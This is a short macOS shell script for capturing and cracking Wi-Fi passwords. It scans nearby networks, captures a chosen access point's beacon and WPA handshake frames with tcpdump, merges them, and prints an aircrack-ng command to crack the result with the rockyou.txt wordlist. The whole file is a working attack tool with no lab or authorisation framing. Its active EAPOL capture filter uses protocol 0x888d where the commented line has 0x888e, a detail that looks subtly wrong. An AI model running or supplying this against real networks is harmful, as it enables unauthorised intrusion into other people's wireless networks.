#!/bin/sh

BASE_PATH=/Users/mikey/Desktop/wifi
AIRPORT=/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport

$AIRPORT -s

read -p "Enter BSSID: " SSID
read -p "Enter Channel: " CHANNEL

mkdir -p $BASE_PATH/$SSID

$AIRPORT -z
$AIRPORT -c$CHANNEL

tcpdump "type mgt subtype beacon and ether src $SSID" -I -c 1 -i en0 -w $BASE_PATH/$SSID/beacon.cap
#tcpdump "type mgt subtype beacon" -I -c 1 -i en0 -w /tmp/beacon.cap

tcpdump "ether proto 0x888d and ether host $SSID" -I -U -vvv -i en0 -w $BASE_PATH/$SSID/eapol.cap
#tcpdump "ether proto 0x888e" -c 4 -I -U -vvv -i en0 -w $BASE_PATH/eapol.cap

mergecap -a -F pcap -w "$BASE_PATH/$SSID/handshake.cap" $BASE_PATH/$SSID/beacon.cap $BASE_PATH/$SSID/eapol.cap

echo Crack with:
echo ""
echo "   aircrack-ng "$BASE_PATH/$SSID/handshake.cap" -w $BASE_PATH/dictionaries/rockyou.txt"
